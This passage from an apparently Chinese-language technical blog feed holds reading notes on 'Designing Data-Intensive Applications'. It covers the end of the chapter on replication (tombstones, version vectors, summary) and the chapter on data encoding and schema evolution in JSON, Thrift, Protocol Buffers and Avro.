<p>然而，如果你想让人们也可以从他们的手推车中<strong>删除</strong>东西，而不是仅仅添加东西，那么把兄弟求并可能不会产生正确的结果：如果你合并了两个兄弟手推车，并且只在其中一个兄弟值里删掉了它，那么被删除的项目会重新出现在兄弟的并集中【37】。为了防止这个问题，一个项目在删除时不能简单地从数据库中删除；相反，系统必须留下一个具有合适版本号的标记，以指示合并兄弟时该项目已被删除。这种删除标记被称为<strong>墓碑（tombstone）</strong>。 （我们之前在 “<a href="https://vonng.gitbooks.io/ddia-cn/content/ch3.html#哈希索引">哈希索引”</a> 中的日志压缩的上下文中看到了墓碑。）</p>
<p>因为在应用程序代码中合并兄弟是复杂且容易出错的，所以有一些数据结构被设计出来用于自动执行这种合并，如 “<a href="https://vonng.gitbooks.io/ddia-cn/content/ch5.html">自动冲突解决</a>” 中讨论的。例如，Riak 的数据类型支持使用称为 CRDT 的数据结构家族【38,39,55】可以以合理的方式自动合并兄弟，包括保留删除。</p>
<h4 id="版本向量"><strong>版本向量</strong></h4>
<p><a href="fig5-13.png">图 5-13</a> 中的示例只使用一个副本。当有多个副本但没有领导者时，算法如何修改？</p>
<p><a href="fig5-13.png">图 5-13</a> 使用单个版本号来捕获操作之间的依赖关系，但是当多个副本并发接受写入时，这是不够的。相反，除了对每个键使用版本号之外，还需要在<strong>每个副本</strong>中使用版本号。每个副本在处理写入时增加自己的版本号，并且跟踪从其他副本中看到的版本号。这个信息指出了要覆盖哪些值，以及保留哪些值作为兄弟。</p>
<p>所有副本的版本号集合称为<strong>版本向量（version vector）</strong>【56】。这个想法的一些变体正在使用，但最有趣的可能是在 Riak 2.0 【58,59】中使用的<strong>分散版本矢量（dotted version vector）</strong>【57】。我们不会深入细节，但是它的工作方式与我们在购物车示例中看到的非常相似。</p>
<p>与<a href="fig5-13.png">图 5-13</a> 中的版本号一样，当读取值时，版本向量会从数据库副本发送到客户端，并且随后写入值时需要将其发送回数据库。 （Riak 将版本向量编码为一个字符串，它称为<strong>因果上下文（causal context）</strong>）。版本向量允许数据库区分覆盖写入和并发写入。</p>
<p>另外，就像在单个副本的例子中，应用程序可能需要合并兄弟。版本向量结构确保从一个副本读取并随后写回到另一个副本是安全的。这样做可能会创建兄弟，但只要兄弟姐妹合并正确，就不会丢失数据。</p>
<blockquote>
<p>版本向量和向量时钟</p>
<p>版本向量有时也被称为矢量时钟，即使它们不完全相同。 差别很微妙 —— 请参阅参考资料的细节【57,60,61】。 简而言之，在比较副本的状态时，版本向量是正确的数据结构。</p>
</blockquote>
<h2 id="本章小结"><strong>本章小结</strong></h2>
<p>本章主要讨论了复制这一技术。</p>
<h3 id="复制的目的">复制的目的</h3>
<p><strong>高可用性</strong></p>
<p>即使在一台机器（或多台机器，或整个数据中心）停机的情况下也能保持系统正常运行</p>
<p><strong>断开连接的操作</strong></p>
<p>允许应用程序在网络中断时继续工作</p>
<p><strong>延迟</strong></p>
<p>将数据放置在距离用户较近的地方，以便用户能够更快地与其交互</p>
<p><strong>可扩展性</strong></p>
<p>能够处理比单个机器更高的读取量可以通过对副本进行读取来处理</p>
<p>尽管是一个简单的目标 - 在几台机器上保留相同数据的副本，但复制却是一个非常棘手的问题。它需要仔细考虑并发和所有可能出错的事情，并处理这些故障的后果。至少，我们需要处理不可用的节点和网络中断（甚至不考虑更隐蔽的故障，例如由于软件错误导致的无提示数据损坏）。</p>
<h3 id="复制的三种主要方法">复制的三种主要方法</h3>
<p><strong>单主复制</strong></p>
<p>客户端将所有写入操作发送到单个节点（领导者），该节点将数据更改事件流发送到其他副本（追随者）。读取可以在任何副本上执行，但从追随者读取可能是陈旧的。</p>
<p><strong>多主复制</strong></p>
<p>客户端发送每个写入到几个领导节点之一，其中任何一个都可以接受写入。领导者将数据更改事件流发送给彼此以及任何跟随者节点。</p>
<p><strong>无主复制</strong></p>
<p>客户端发送每个写入到几个节点，并从多个节点并行读取，以检测和纠正具有陈旧数据的节点。 每种方法都有优点和缺点。单主复制是非常流行的，因为它很容易理解，不需要担心冲突解决。在出现故障节点，网络中断和延迟峰值的情况下，多领导者和无领导者复制可以更加稳健，但以更难以推理并仅提供非常弱的一致性保证为代价。</p>
<p>复制可以是同步的，也可以是异步的，在发生故障时对系统行为有深远的影响。尽管在系统运行平稳时异步复制速度很快，但是在复制滞后增加和服务器故障时要弄清楚会发生什么，这一点很重要。如果一个领导者失败了，并且你推动一个异步更新的追随者成为新的领导者，那么最近承诺的数据可能会丢失。</p>
<h3 id="复制滞后的问题一致性模型">复制滞后的问题 &amp; 一致性模型</h3>
<p><strong>写后读</strong></p>
<p>用户应该总是看到自己提交的数据。</p>
<p><strong>单调读</strong></p>
<p>用户在一个时间点看到数据后，他们不应该在某个早期时间点看到数据。</p>
<p><strong>一致前缀读</strong></p>
<p>用户应该将数据视为具有因果意义的状态：例如，按照正确的顺序查看问题及其答复。</p>
<p>最后，我们讨论了多领导者和无领导者复制方法所固有的并发问题：因为他们允许多个写入并发发生冲突。我们研究了一个数据库可能使用的算法来确定一个操作是否发生在另一个操作之前，或者它们是否同时发生。我们还谈到了通过合并并发更新来解决冲突的方法。</p>
<p>在下一章中，我们将继续研究分布在多个机器上的数据，通过复制的对应方式：将大数据集分割成分区。</p>
<h2 id="参考">参考</h2>
<ul>
<li><a href="https://vonng.gitbooks.io/ddia-cn/content/ch5.html">第五章：复制・ddia-cn</a></li>
</ul>
]]></content>
      <categories>
        <category>阅读</category>
        <category>后端</category>
        <category>DDIA</category>
      </categories>
      <tags>
        <tag>DDIA</tag>
        <tag>设计数据密集型应用</tag>
        <tag>复制</tag>
      </tags>
  </entry>
  <entry>
    <title>DDIA 阅读笔记第四章：编码与演化</title>
    <url>/blog/2024/05/05/DDIA-Note-4/</url>
    <content><![CDATA[<h2 id="摘要">摘要</h2>
<p>本章介绍几种不同的编码格式，包括 JSON、XML、Protocol Buffers、Thrift 和 Avr，它们对兼容性的影响，如何应对模式变化；还讨论如何使用这些格式进行数据存储和通信。</p>
<span id="more"></span>
<h2 id="简介">简介</h2>
<p>应用程序不可避免地随时间而变化。新产品的推出，对需求的深入理解，或者商业环境的变化，总会伴随着 <strong>功能（feature）</strong> 的增增改改。</p>
<ul>
<li>可演化性（evolvability） ：应该尽力构建能灵活适应变化的系统。</li>
</ul>
<p>在大多数情况下，修改应用程序的功能也意味着需要更改其存储的数据：可能需要使用新的字段或记录类型，或者以新方式展示现有数据。数据模型有不同的方法来应对这种变化：</p>
<ul>
<li>​ 关系数据库通常假定数据库中的所有数据都遵循一个模式：尽管可以更改该模式（通过模式迁移，migration，即 <code>ALTER</code> 语句），但是在任何时间点都有且仅有一个正确的模式。</li>
<li><strong>读时模式</strong>（schema-on-read，或 <strong>无模式</strong>，即 schemaless）数据库不会强制一个模式，因此数据库可以包含在不同时间写入的新老数据格式的混合（ “<strong><a href="http://ddia.vonng.com/#/ch2?id=文档模型中的模式灵活性">文档模型中的模式灵活性</a></strong>” ）。</li>
</ul>
<h3 id="模式变更">模式变更</h3>
<p>当数据 <strong>格式（format）</strong> 或 <strong>模式（schema）</strong> 发生变化时，通常需要对应用程序代码进行相应的更改（例如，为记录添加新字段，然后修改程序开始读写该字段）。但在大型应用程序中，代码变更通常不会立即完成：</p>
<ul>
<li>对于 <strong>服务端（server-side）</strong> 应用程序，可能需要执行 <strong>滚动升级 （rolling upgrade）</strong> （也称为 <strong>阶段发布（staged rollout）</strong> ），一次将新版本部署到少数几个节点，检查新版本是否运行正常，然后逐渐部完所有的节点。这样无需中断服务即可部署新版本，为频繁发布提供了可行性，从而带来更好的可演化性。</li>
<li>对于 <strong>客户端（client-side）</strong> 应用程序，升不升级就要看用户的心情了。用户可能相当长一段时间里都不会去升级软件。</li>
</ul>
<h3 id="双向兼容">双向兼容</h3>
<p>这意味着，新旧版本的代码，以及新旧数据格式可能会在系统中同时共处。系统想要继续顺利运行，就需要保持 <strong>双向兼容性</strong>：</p>
<ul>
<li>向后兼容 (backward compatibility)：新的代码可以读取由旧的代码写入的数据。</li>
<li>向前兼容 (forward compatibility)：旧的代码可以读取由新的代码写入的数据。</li>
</ul>
<p>向后兼容性通常并不难实现：新代码的作者当然知道由旧代码使用的数据格式，因此可以显示地处理它（最简单的办法是，保留旧代码即可读取旧数据）。</p>
<p>向前兼容性可能会更棘手，因为旧版的程序需要忽略新版数据格式中新增的部分。</p>
<h2 id="编码数据的格式"><strong>编码数据的格式</strong></h2>
<p>程序通常（至少）使用两种形式的数据：</p>
<ol type="1">
<li>在内存中，数据保存在对象、结构体、列表、数组、散列表、树等中。 这些数据结构针对 CPU 的高效访问和操作进行了优化（通常使用指针）。</li>
<li>如果要将数据写入文件，或通过网络发送，则必须将其 <strong>编码（encode）</strong> 为某种自包含的字节序列（例如，JSON 文档）。 由于每个进程都有自己独立的地址空间，一个进程中的指针对任何其他进程都没有意义，所以这个字节序列表示会与通常在内存中使用的数据结构完全不同。</li>
</ol>
<p>所以，需要在两种表示之间进行某种类型的翻译。</p>
<ul>
<li>从内存中表示到字节序列的转换称为 <strong>编码（Encoding）</strong> ，也称为 <strong>序列化（serialization）</strong> 或 <strong>编组（marshalling）</strong></li>
<li>反过来称为 <strong>解码（Decoding），也称为解析（Parsing）</strong>，<strong>反序列化（deserialization）</strong>，<strong>反编组 (unmarshalling）</strong>。</li>
</ul>
<p>注意：</p>
<ul>
<li><strong>编码（encode）</strong> 与 <strong>加密（encryption）</strong> 无关。 本书不讨论加密。</li>
<li>Marshal 与 Serialization 的区别：Marshal 不仅传输对象的状态，而且会一起传输对象的方法（相关代码）。</li>
</ul>
<blockquote>
<p>术语冲突</p>
<p><strong>不幸的是，在 <a href="http://ddia.vonng.com/#/ch7">第七章</a>： 事务（Transaction） 的上下文里，序列化（Serialization） 这个术语也出现了，而且具有完全不同的含义。尽管序列化可能是更常见的术语，为了避免术语重载，本书中坚持使用 编码（Encoding） 表达此含义。</strong></p>
</blockquote>
<p>这是一个常见的问题，因而有许多库和编码格式可供选择。</p>
<h3 id="语言特定的格式"><strong>语言特定的格式</strong></h3>
<p>许多编程语言都内建了将内存对象编码为字节序列的支持。例如，Java 有 <code>java.io.Serializable</code> 【1】，Ruby 有 <code>Marshal</code>【2】，Python 有 <code>pickle</code>【3】等等。许多第三方库也存在，例如 <code>Kryo for Java</code> 【4】。</p>
<p>这些编码库非常方便，可以用很少的额外代码实现内存对象的保存与恢复。但是它们也有一些深层次的问题：</p>
<ul>
<li>这类编码通常与特定的编程语言深度绑定，其他语言很难读取这种数据。如果以这类编码存储或传输数据，那你就和这门语言绑死在一起了。并且很难将系统与其他组织的系统（可能用的是不同的语言）进行集成。</li>
<li>为了恢复相同对象类型的数据，解码过程需要 <strong>实例化任意类</strong> 的能力，这通常是安全问题的一个来源【5】：如果攻击者可以让应用程序解码任意的字节序列，他们就能实例化任意的类，这会允许他们做可怕的事情，如远程执行任意代码【6,7】。</li>
<li>在这些库中，数据版本控制通常是事后才考虑的。因为它们旨在快速简便地对数据进行编码，所以往往忽略了前向后向兼容性带来的麻烦问题。</li>
<li>效率（编码或解码所花费的 CPU 时间，以及编码结构的大小）往往也是事后才考虑的。 例如，Java 的内置序列化由于其糟糕的性能和臃肿的编码而臭名昭著【8】。</li>
</ul>
<p>因此，除非临时使用，采用语言内置编码通常是一个坏主意。</p>
<h3 id="jsonxml和二进制变体"><strong>JSON、XML 和二进制变体</strong></h3>
<p>JSON 和 XML 是最常用的可被多种编程语言读写的标准编码。它们广为人知，广受支持，也 “广受憎恶”。</p>
<ul>
<li>XML 经常收到批评：过于冗长且复杂</li>
<li> JSON 的流行则主要源于（通过成为 JavaScript 的一个子集）Web 浏览器的内置支持，以及相对于 XML 的简单性。</li>
<li>CSV 是另一种流行的与语言无关的格式，尽管其功能相对较弱。</li>
</ul>
<p>JSON，XML 和 CSV 属于文本格式，具有人类可读性。但它们也存在一些微妙的问题：</p>
<ul>
<li><p>数字（numbers）</p>
<p>编码有很多模糊之处。在 XML 和 CSV 中，无法直接区分数字和碰巧由数字组成的字符串。 JSON 虽然区分字符串与数字，但并不区分整数和浮点数，并且不能指定精度。</p>
<ul>
<li>处理大数字时是个问题。例如大于<span class="math inline"> \(2^{53}\)</span> 的整数无法使用 IEEE 754 双精度浮点数精确表示，因此在使用浮点数（例如 JavaScript）的语言进行分析时，这些数字会变得不准确。</li>
</ul></li>
<li><p>JSON 和 XML 对 Unicode 字符串有很好的支持，但是它们不支持二进制数据（即不带 <strong>字符编码 (character encoding)</strong> 的字节序列）。可以通过使用 Base64 将二进制数据编码为文本来绕过此限制，虽然管用，但比较 Hacky，并且会增加三分之一的数据大小。</p></li>
<li><p>XML 和 JSON 都有可选的模式支持。这些模式语言相当强大，所以学习和实现起来都相当复杂。 XML 模式的使用相当普遍，但许多基于 JSON 的工具才不会去折腾模式。对数据的正确解读（例如区分数值与二进制串）取决于模式中的信息，因此不使用 XML/JSON 模式的应用程序可能需要对相应的编码 / 解码逻辑进行硬编码。</p></li>
<li><p>CSV 没有任何模式，因此每行和每列的含义完全由应用程序自行定义。如果应用程序变更添加了新的行或列，那么这种变更必须通过手工处理。 CSV 也是一个相当模糊的格式（如果一个值包含逗号或换行符，会发生什么？）。尽管其转义规则已经被正式指定【13】，但并不是所有的解析器都正确的实现了标准。</p></li>
</ul>
<p>尽管存在这些缺陷，但 JSON、XML 和 CSV 对很多需求来说已经足够好了。它们很可能会继续流行下去，特别是作为数据交换格式来说（即将数据从一个组织发送到另一个组织）。在这种情况下，只要人们对格式是什么意见一致，格式有多美观或者效率有多高效就无所谓了。让不同的组织就这些东西达成一致的难度超过了绝大多数问题。</p>
<h3 id="二进制编码"><strong>二进制编码</strong></h3>
<p>对于仅在组织内部使用的数据，使用通用的编码格式压力较小。例如，可以选择更紧凑或更快的解析格式。虽然对小数据集来说，收益可以忽略不计；但一旦达到 TB 级别，数据格式的选型就会产生巨大的影响。</p>
<p>JSON 比 XML 简洁，但与二进制格式相比还是太占空间。这一事实导致大量二进制编码版本 JSON（MessagePack、BSON、BJSON、UBJSON、BISON 和 Smile 等） 和 XML（例如 WBXML 和 Fast Infoset）的出现。这些格式已经在各种各样的领域中采用，但是没有一个能像文本版 JSON 和 XML 那样被广泛采用。</p>
<p>这些格式中的一些扩展了一组数据类型（例如，区分整数和浮点数，或者增加对二进制字符串的支持），另一方面，它们没有改变 JSON / XML 的数据模型。特别是由于它们没有规定模式，所以它们需要在编码数据中包含所有的对象字段名称。也就是说，在 <strong><a href="http://ddia.vonng.com/#/">例 4-1</a></strong> 中的 JSON 文档的二进制编码中，需要在某处包含字符串 <code>userName</code>，<code>favoriteNumber</code> 和 <code>interests</code>。</p>
<p><strong>例 4-1 本章中用于展示二进制编码的示例记录</strong></p>
<figure class="highlight json"><table><tbody><tr><td class="code"><pre><span class="line">{</span><br><span class="line">    <span class="attr">"userName"</span>: <span class="string">"Martin"</span>,</span><br><span class="line">    <span class="attr">"favoriteNumber"</span>: <span class="number">1337</span>,</span><br><span class="line">    <span class="attr">"interests"</span>: [<span class="string">"daydreaming"</span>, <span class="string">"hacking"</span>]</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>一个 MessagePack 的例子，它是一个 JSON 的二进制编码。图 4-1 显示了如果使用 MessagePack 【14】对 <strong><a href="http://ddia.vonng.com/#/">例 4-1</a></strong> 中的 JSON 文档进行编码，则得到的字节序列。前几个字节如下：</p>
<ol type="1">
<li>第一个字节 <code>0x83</code> 表示接下来是 <strong>3</strong> 个字段（低四位 = <code>0x03</code>）的 <strong>对象 object</strong>（高四位 = <code>0x80</code>）。 （如果想知道如果一个对象有 15 个以上的字段会发生什么情况，字段的数量塞不进 4 个 bit 里，那么它会用另一个不同的类型标识符，字段的数量被编码两个或四个字节）。</li>
<li>第二个字节 <code>0xa8</code> 表示接下来是 <strong>8</strong> 字节长（低四位 = <code>0x08</code>）的字符串（高四位 = <code>0x0a</code>）。</li>
<li>接下来八个字节是 ASCII 字符串形式的字段名称 <code>userName</code>。由于之前已经指明长度，不需要任何标记来标识字符串的结束位置（或者任何转义）。</li>
<li>接下来的七个字节对前缀为 <code>0xa6</code> 的六个字母的字符串值 <code>Martin</code> 进行编码，依此类推。</li>
</ol>
<p>二进制编码长度为 66 个字节，仅略小于文本 JSON 编码所取的 81 个字节（删除了空白）。所有的 JSON 的二进制编码在这方面是相似的。空间节省了一丁点（以及解析加速）是否能弥补可读性的损失，谁也说不准。</p>
<p>在下面的章节中，能达到比这好得多的结果，只用 32 个字节对相同的记录进行编码。</p>
<p><img src="fig4-1.png"></p>
<h3 id="thrift与protocol-buffers"><strong>Thrift 与 Protocol Buffers</strong></h3>
<p>Apache Thrift 【15】和 Protocol Buffers（protobuf）【16】是基于相同原理的二进制编码库。 Protocol Buffers 最初是在 Google 开发的，Thrift 最初是在 Facebook 开发的，并且都是在 2007~2008 开源的【17】。 Thrift 和 Protocol Buffers 都需要一个模式来编码任何数据。要在 Thrift 的 <strong><a href="http://ddia.vonng.com/#/">例 4-1</a></strong> 中对数据进行编码，可以使用 Thrift <strong>接口定义语言（IDL）</strong> 来描述模式，如下所示：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">struct Person {</span><br><span class="line">    1: required string       userName,</span><br><span class="line">    2: optional i64          favoriteNumber,</span><br><span class="line">    3: optional list&lt;string&gt; interests</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>Protocol Buffers 的等价模式定义看起来非常相似：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">message Person {</span><br><span class="line">    required string user_name       = 1;</span><br><span class="line">    optional int64  favorite_number = 2;</span><br><span class="line">    repeated string interests       = 3;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>Thrift 和 Protocol Buffers 每一个都带有一个代码生成工具，它采用了类似于这里所示的模式定义，并且生成了以各种编程语言实现模式的类【18】。应用程序代码可以调用此生成的代码来对模式的记录进行编码或解码。</p>
<blockquote>
<p><a href="https://andrewpqc.github.io/2019/02/24/thrift/">Thrift 序列化协议浅析 | Andrew's Blog (andrewpqc.github.io)</a></p>
</blockquote>
<p>Thrift 有两种不同的、跨语言的二进制编码格式：</p>
<ul>
<li><p>BinaryProtocol：详见</p>
<p>thrift/doc/specs/thrift-binary-protocol.md</p>
<p>，对于结构体编码规则为</p>
<ul>
<li>field-type：1 字节</li>
<li> field id：2 字节，记录绝对值</li>
<li> field-value：int8 1 字节，int16 2 字节，以此类推</li>
</ul></li>
<li><p> CompactProtocol：压缩编码，详见</p>
<p>thrift/doc/specs/thrift-compact-protocol.md</p>
<p>。差距主要是整数使用了 zigzag 和变长编码（var int），结构体 header 压缩，长度字段使用变长整数。</p>
<ul>
<li>field-type：4 bit 无符号</li>
<li> field id：4 bit，记录相对差值；或 16bit 符号 zigzag 整数记录绝对值</li>
<li> field-value：整数使用 zigzag 和变长编码（var int），长度整数可变。
<ul>
<li>var int：解决小整数存储浪费问题，每个字节最高位表示是否还有剩余字节，有效字节有 7 bit，int32 需要 1-5 字节存储。</li>
<li>zigzag：解决大负数无法压缩的问题，高位 1 太多。方法是将负数编码成正奇数，正数编码成偶数。解码的时候遇到偶数直接除 2 就是原值，遇到奇数就加 1 除 2 再取负就是原值。</li>
</ul></li>
</ul></li>
<li><p>每个字节的最高位用来指示是否还有更多的字节。type 4 位，field tag 4 位记录相对差值。</p></li>
</ul>
<p>先来看看 BinaryProtocol。使用这种格式的编码来编码 <strong><a href="http://ddia.vonng.com/#/">例 4-1</a></strong> 中的消息只需要 59 个字节，如 <strong><a href="http://ddia.vonng.com/#/img/fig4-2.png">图 4-2</a></strong> 所示【19】。</p>
<p><img src="fig4-2.png"></p>
<p><strong>图 4-2 使用 Thrift 二进制协议编码的记录</strong></p>
<p>可以发现：</p>
<ul>
<li>每个字段都有一个类型标识（type），还可以根据需要指定长度（字符串、list） 。出现在数据中的字符串 <code>(“Martin”, “daydreaming”, “hacking”)</code> 也被编码为 ASCII（或者说，UTF-8），与之前类似。</li>
<li>编码数据包含字段标记（tag），数字 <code>(1, 2 和 3)</code>，而非字段名。</li>
</ul>
<p>Thrift CompactProtocol 编码在语义上等同于 BinaryProtocol，但是如 <strong><a href="http://ddia.vonng.com/#/img/fig4-3.png">图 4-3</a></strong> 所示，它只将相同的信息打包成只有 34 个字节。它：</p>
<ul>
<li>将字段类型和标签号打包到单个字节中</li>
<li>使用可变长度整数来实现。
<ul>
<li>数字 1337 不是使用全部八个字节，而是用两个字节编码，每个字节的最高位用来指示是否还有更多的字节。这意味着 - 64 到 63 之间的数字被编码为一个字节，-8192 和 8191 之间的数字以两个字节编码，等等。较大的数字使用更多的字节。</li>
</ul></li>
</ul>
<p><img src="fig4-3.png"></p>
<p><strong>图 4-3 使用 Thrift 压缩协议编码的记录</strong></p>
<p>最后，Protocol Buffers（只有一种二进制编码格式）对相同的数据进行编码，如 <strong><a href="http://ddia.vonng.com/#/img/fig4-4.png">图 4-4</a></strong> 所示。 它的打包方式稍有不同，但与 Thrift 的 CompactProtocol 非常相似。 Protobuf 将同样的记录塞进了 33 个字节中。</p>
<p><img src="fig4-4.png"></p>
<p><strong>图 4-4 使用 Protobuf 编码的记录</strong></p>
<p>需要注意的一个细节：在前面所示的模式中，每个字段被标记为必需或可选，但是这对字段如何编码没有任何影响（二进制数据中没有任何字段指示某字段是否必须）。区别在于，如果字段设置为 <code>required</code>，但未设置该字段，则所需的运行时检查将失败，这对于捕获错误非常有用。</p>
<h4 id="字段标签和模式演变"><strong>字段标签和模式演变</strong></h4>
<p>模式演变：模式不可避免地需要随着时间而改变。 Thrift 和 Protocol Buffers 如何处理模式更改，同时保持向后兼容性？</p>
<p>从示例中可以看出，编码的记录就是其编码字段的拼接。每个字段由其标签号码（样本模式中的数字 1,2,3）标识，并用数据类型（例如字符串或整数）注释。如果没有设置字段值，则简单地从编码记录中省略。从中可以看到，字段标记对编码数据的含义至关重要。你可以更改架构中字段的名称，因为编码的数据永远不会引用字段名称，但不能更改字段的标记，因为这会使所有现有的编码数据无效。</p>
<p>添加新的字段到架构，只需给每个字段一个新的标签号码。</p>
<ul>
<li>向前兼容性：旧的代码可以简单地忽略新添加的、未识别标识的字段。数据类型注释允许解析器确定需要跳过的字节数。这保证了旧代码可以读取由新代码编写的记录。</li>
<li>向后兼容性：
<ul>
<li>只要每个字段都有唯一的标签标识，新的代码总是可以读取旧的数据，因为标签标识仍然具有相同的含义。</li>
<li>添加新的字段，不能设置为必需。在模式的初始部署之后 <strong>添加的每个字段必须是可选的或具有默认值</strong>。</li>
</ul></li>
</ul>
<p>删除一个字段就像添加一个字段，只是这次要考虑的是向前兼容性。这意味着：</p>
<ul>
<li>只能删除一个可选的字段（必需字段永远不能删除）</li>
<li>不能再次使用相同的标签号码（因为你可能仍然有数据写在包含旧标签号码的地方，而该字段必须被新代码忽略）。</li>
</ul>
<h4 id="数据类型和模式演变"><strong>数据类型和模式演变</strong></h4>
<p>改变字段的数据类型，也许是可能的，但是有一个风险，值将失去精度或被截断。例如，假设你将一个 32 位的整数变成一个 64 位的整数。新代码可以轻松读取旧代码写入的数据，因为解析器可以用零填充任何缺失的位。但是，如果旧代码读取由新代码写入的数据，则旧代码仍使用 32 位变量来保存该值。如果解码的 64 位值不适合 32 位，则它将被截断。</p>
<p>Protobuf 没有列表或数组数据类型，而是有一个字段的重复标记（<code>repeated</code>，这是除必需和可选之外的第三个选项）。如 <strong><a href="http://ddia.vonng.com/#/img/fig4-4.png">图 4-4</a></strong> 所示，重复字段的编码正如它所说的那样：同一个字段标记只是简单地出现在记录中。这允许将可选（单值）字段更改为重复（多值）字段。读取旧数据的新代码会看到一个包含零个或一个元素的列表（取决于该字段是否存在）。读取新数据的旧代码只能看到列表的最后一个元素。</p>
<p>Thrift 有一个专用的 list 数据类型，它使用列表元素的数据类型进行参数化。这不允许 Protocol Buffers 所做的从单值到多值的演变，但是它具有支持嵌套列表的优点。</p>
<h3 id="avro">Avro</h3>
<p>Apache Avro 【20】是另一种二进制编码格式，与 Protocol Buffers 和 Thrift 有着有趣的不同。 它是作为 Hadoop 的一个子项目在 2009 年开始的，因为 Thrift 不适合 Hadoop 的用例【21】。</p>
<p>Avro 也使用模式来指定正在编码的数据的结构。 它有两种模式语言：一种（Avro IDL）用于人工编辑，一种（基于 JSON）更易于机器读取。</p>
<p>我们用 Avro IDL 编写的示例模式可能如下所示， 模式中没有标签号码：</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line">record Person {</span><br><span class="line">    <span class="built_in">string</span>                userName;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> {</span> null, <span class="keyword">long</span> }  favoriteNumber = null;</span><br><span class="line">    <span class="built_in">array</span>&lt;<span class="built_in">string</span>&gt;         interests;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>等价的 JSON 表示：</p>
<figure class="highlight json"><table><tbody><tr><td class="code"><pre><span class="line">{</span><br><span class="line">    <span class="attr">"type"</span>: <span class="string">"record"</span>,</span><br><span class="line">    <span class="attr">"name"</span>: <span class="string">"Person"</span>,</span><br><span class="line">    <span class="attr">"fields"</span>: [</span><br><span class="line">        {<span class="attr">"name"</span>: <span class="string">"userName"</span>, <span class="attr">"type"</span>: <span class="string">"string"</span>},</span><br><span class="line">        {<span class="attr">"name"</span>: <span class="string">"favoriteNumber"</span>, <span class="attr">"type"</span>: [<span class="string">"null"</span>, <span class="string">"long"</span>], <span class="attr">"default"</span>: <span class="literal">null</span>},</span><br><span class="line">        {<span class="attr">"name"</span>: <span class="string">"interests"</span>, <span class="attr">"type"</span>: {<span class="attr">"type"</span>: <span class="string">"array"</span>, <span class="attr">"items"</span>: <span class="string">"string"</span>}}</span><br><span class="line">    ]</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>如果我们使用这个模式编码我们的例子记录（<strong><a href="http://ddia.vonng.com/#/">例 4-1</a></strong>），Avro 二进制编码只有 32 个字节长，这是我们所见过的所有编码中最紧凑的。 编码字节序列的分解如 <strong><a href="http://ddia.vonng.com/#/img/fig4-5.png">图 4-5</a></strong> 所示。</p>
<p>如果你检查字节序列，你可以看到没有什么可以识别字段或其数据类型。 编码只是由连在一起的值组成。 一个字符串只是一个长度前缀，后跟 UTF-8 字节，但是在被包含的数据中没有任何内容告诉你它是一个字符串。 它可以是一个整数，也可以是其他的整数。 整数使用可变长度编码（与 Thrift 的 CompactProtocol 相同）进行编码。</p>
<p><img src="fig4-5.png"></p>
<p><strong>图 4-5 使用 Avro 编码的记录</strong></p>
<p>为了解析二进制数据，你按照它们出现在模式中的顺序遍历这些字段，并使用模式来告诉你每个字段的数据类型。这意味着如果读取数据的代码使用与写入数据的代码完全相同的模式，才能正确解码二进制数据。Reader 和 Writer 之间的模式不匹配意味着错误地解码数据。</p>
<p>那么，Avro 如何支持模式演变呢？</p>
<h4 id="writer模式与reader模式"><strong>Writer 模式与 Reader 模式</strong></h4>
<p>有了 Avro，当应用程序想要编码一些数据（将其写入文件或数据库，通过网络发送等）时，它使用它知道的任何版本的模式编码数据，例如，模式可能被编译到应用程序中。这被称为 Writer 模式。</p>
<p>当一个应用程序想要解码一些数据（从一个文件或数据库读取数据，从网络接收数据等）时，它希望数据在某个模式中，这就是 Reader 模式。这是应用程序代码所依赖的模式，在应用程序的构建过程中，代码可能已经从该模式生成。</p>
<p>Avro 的关键思想是 Writer 模式和 Reader 模式不必是相同的 - 他们只需要兼容。当数据解码（读取）时，Avro 库通过并排查看 Writer 模式和 Reader 模式并将数据从 Writer 模式转换到 Reader 模式来解决差异。 Avro 规范【20】确切地定义了这种解析的工作原理，如 <strong><a href="http://ddia.vonng.com/#/img/fig4-6.png">图 4-6</a></strong> 所示。</p>
<p>例如，如果 Writer 模式和 Reader 模式的字段顺序不同，这是没有问题的，因为模式解析通过字段名匹配字段。</p>
<ul>
<li>如果读取数据的代码遇到出现在 Writer 模式中但不在 Reader 模式中的字段，则忽略它。</li>
<li>如果读取数据的代码需要某个字段，但是 Writer 模式不包含该名称的字段，则使用在 Reader 模式中声明的默认值填充。</li>
</ul>
<p><img src="fig4-6.png"></p>
<p><strong>图 4-6 一个 Avro Reader 解决读写模式的差异</strong></p>
<h4 id="模式演变规则"><strong>模式演变规则</strong></h4>
<p>Avro 下的兼容性：</p>
<ul>
<li>向前兼容：新版本的 Writer 模式搭配旧版本的 Reader 模式。</li>
<li>向后兼容：旧版本的 Writer 模式搭配新版本的 Reader 模式。</li>
</ul>
<p>为了保持兼容性，你只能添加或删除具有默认值的字段。</p>
<ul>
<li>添加了一个新的、有默认值的字段（存在于新模式，旧模式中不存在）。当使用新模式的 Reader 读取使用旧模式写入的记录时，将为缺少的字段填充默认值。</li>
<li>删除同理</li>
</ul>
<p>违反兼容性：</p>
<ul>
<li>添加一个没有默认值的字段，新的 Reader 将无法读取旧 Writer 写的数据，破坏向后兼容性。</li>
<li>删除没有默认值的字段，旧的 Reader 将无法读取新 Writer 写入的数据，打破向前兼容性。</li>
</ul>
<p>Avro 没有像 Protocol Buffers 和 Thrift 那样的 <code>optional</code> 和 <code>required</code> 标记，它使用联合类型和默认值，显式地标识某字段可以为 null，例如，<code>union {null, long, string} field;</code> 表示 field 可以是数字或字符串，也可以是 <code>null</code>。</p>
<ul>
<li>如果要将 null 作为默认值，则它必须是 union 的分支之一</li>
<li> union 写法虽然更冗长，但是明确标识有助于防止出错</li>
</ul>
